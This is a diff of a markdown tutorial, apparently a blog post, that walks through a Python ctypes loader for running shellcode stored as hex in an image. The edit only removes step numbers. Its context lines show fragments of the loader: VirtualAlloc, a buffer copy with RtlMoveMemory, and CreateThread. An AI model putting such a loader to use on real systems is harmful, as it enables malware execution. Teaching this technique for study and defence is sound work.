@@ -297,8 +297,6 @@ If we skip over the `shellcode_exec()` function for now, the final parsing we do
 
 To actually execute the said hex, which was encoded as a string in our image, in python, we'll use the `ctypes` library. `ctypes` allows us to directly interface with Windows API functions. Let's break down tis function and the Win32 APIs used to execute the shellcode line by line!
 
-1.
-
 ```python
 pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                       ctypes.c_int(len(shellcode)),
@@ -318,15 +316,11 @@ pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 
 This is saved to the `pointer` variable, which is the memory address of our reserved memory space.  
 
-2.
-
 ```python
 buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 ```
 
 This line creates a ctypes buffer that contains the shellcode we previously decoded. This will allow us to move this variable into a reserved memory space to be executed.
-
-3. 
 
 ```python
 ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
@@ -341,8 +335,6 @@ ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
 * Source - The pointer of the memory to be copied. In our case, we can just supply our buffer variable.
 
 * Length - The length, in bytes, of the memory to be copied. In our case this is just `len(shellcode)`
-
-4. 
 
 ```python
 thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
